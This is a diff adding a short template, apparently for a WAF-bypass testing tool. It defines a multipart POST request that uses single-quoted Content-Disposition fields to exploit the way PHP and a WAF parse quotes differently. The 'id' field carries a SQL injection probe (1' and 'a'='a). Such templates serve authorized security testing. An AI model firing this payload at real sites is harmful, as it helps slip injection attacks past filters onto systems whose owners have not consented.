@@ -1,0 +1,19 @@
+# @name: multipart单双引号混合
+# @tags: post,multipart,quote,mixing,php,id,bypass
+# @color: ice
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_quote_mixing
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: Content-Disposition 中 name 与 filename 使用单引号而非双引号，PHP 与 WAF 对引号风格的解析不一致，可能造成 WAF 取错字段或漏检 filename。参考 do9gy Part2 第3条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name='id'; filename='1.png'
+
+1' and 'a'='a
+--a--
